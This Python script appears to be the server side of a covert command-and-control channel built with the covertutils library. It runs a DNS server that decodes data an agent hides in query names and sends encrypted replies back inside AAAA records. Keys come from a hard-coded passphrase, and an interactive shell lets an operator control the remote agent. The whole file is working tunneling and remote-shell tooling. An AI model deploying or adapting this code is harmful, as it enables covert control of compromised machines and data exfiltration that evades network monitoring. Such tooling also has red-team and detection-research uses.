#!/usr/bin/env python
#============================== Imports part =============================

from covertutils.handlers import ResponseOnlyHandler
from covertutils.orchestration import SimpleOrchestrator

from covertutils.shells.impl import StandardShell, ExtendableShell, SimpleShell

from threading import Thread		# Need a thread for running a sniffer
from time import sleep			# I spin lock a lot

from random import randint		# Generating ICMP and IP id fields needs randomness
from struct import pack			# packing a unixtime in Pings is key
import time						# used for unixtime

from os import urandom
import sys						# Used for arguments

from dnslib import RR,QTYPE,RCODE,TXT,parse_time,AAAA,A
from dnslib.label import DNSLabel
from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger

import socket
try :
	import Queue as queue
except :
	import queue

# passphrase = sys.argv[2]		# The passphrase the agent uses
passphrase = "App1e5&0raNg3s"	# This is used to generate encryption keys


dns_data = queue.Queue()
dns_reply = queue.Queue()


def decode_payload( data ) :

	enc_data = data.replace("-","/").replace("_","+").strip()
	for i in range(2) :
		try :
			return enc_data.decode('base64')
		except Exception as e:
			# Appends '=' if data could not be decoded
			enc_data += '='


class HandlerResolver(BaseResolver):

	def __init__(self,origin,ttl):
		self.origin = DNSLabel(origin)
		self.ttl = parse_time(ttl)

	def resolve(self,request,handler):

		global dns_data
		global dns_reply

		reply = request.reply()
		qname = request.q.qname
		qname_str = str(qname)
		enc_data = qname_str.split('.')[0]
		data = decode_payload(enc_data)

		if request.q.qtype == QTYPE.A :		# The A version of the query
			# orig_response = gethostbyname()
			reply.add_answer(RR(qname,QTYPE.A,ttl=self.ttl,
								rdata=A('127.0.0.1')))

		if request.q.qtype == QTYPE.AAAA :		# The A version of the query
			if data :
				dns_data.put(data)

			try :
				data = dns_reply.get( False, 2 )
				dns_reply.task_done()
			except Exception as e :
				print "Sending Random data < for '%s'" % qname_str
				data = urandom(16)

			aaaa_repl = socket.inet_ntop(socket.AF_INET6, data)

			reply.add_answer(RR(qname,QTYPE.AAAA,ttl=self.ttl,
								rdata=AAAA(aaaa_repl)))
			# print reply

		# print "Replying to query for '%s" % qname_str
		return reply


import logging
resolver = HandlerResolver('.', '60s')
logger = DNSLogger('-request,-reply,-truncated,-error,-recv,-send,-data', '')

udp_server = DNSServer(resolver,
						   port= 53,
						   # port= 5353,
						   # address=args.address,
						   logger=logger
						   )
udp_server.start_thread()



# #============================== Networking part ===========================
# # The networking is handled by Python and Scapy. No 'covertutils' code here...


def recv( ) :		# Networking Wrapper function needed for the handler
	global dns_data
	pkt = dns_data.get()	# Get the first packet
	dns_data.task_done()
	return pkt		# Return the raw data to Handler


def send( raw_data ) :	# Networking Wrapper function needed for the handler

	global dns_reply
	dns_reply.put(raw_data)


# #==========================================================================


# #============================== Handler Overriding part ===================

#	ResponseOnlyHandler because the Agent never sends packets adHoc but only as responses
class Handler( ResponseOnlyHandler ) :

	def onMessage( self, stream, message ) :	# When a Message arrives
		# If the Parent Class would respond (the message was a request), don't bother responding
		responded = super( Handler, self ).onMessage( stream, message )
		if not responded :	# If the message was real data (not 'ResponseOnlyHandler.request_data' string), the Parent Class didn't respond
			self.queueSend("X", 'control');	# Make it respond anyway with 'X' (see Client)
			responded = super( Handler, self ).onMessage( stream, message )
			assert responded == True		# This way we know it responsed!


	def onChunk( self, stream, message ) :	# When a Chunk arrives
		if not message :	# If it is not a complete message (but a part of one)
			self.queueSend( self.request_data, stream )	# Add a message to the send queue
			resp = ResponseOnlyHandler.onMessage( self, stream, self.request_data  )	# Run the ResponseOnlyHandler onMessage
			# That automatically responds with the next Message in queue when called. (Always responding to messages behavior)


	def onNotRecognised( self ) :	# When Junk arrives
		pass			# Do nothing

#==========================================================================



# #=============================Handler Creation=============================


orchestrator = SimpleOrchestrator( passphrase,	# Encryption keys generated from the passphrase
				tag_length = 2,		# The tag length in bytes
				out_length = 16,	# The absolute output byte length (with tags)
				in_length = 35,		# The absolute input byte length (with tags)
				# streams = ['heartbeat'],	# Stream 'control' will be automatically added as failsafe mechanism
				reverse = True )	# Reverse the encryption channels - Agent has `reverse = False`

handler = Handler( recv, send, orchestrator, request_data = 'X' )	# Instantiate the Handler object. Finally!

#==========================================================================


#============================== Shell Design part ========================

shell = ExtendableShell( handler, ignore_messages = 'X' )	# 'X' is used for polling
shell.start( False )
import os
os._exit(-1)
udp_server.stop_thread()
#==========================================================================

#	Magic!
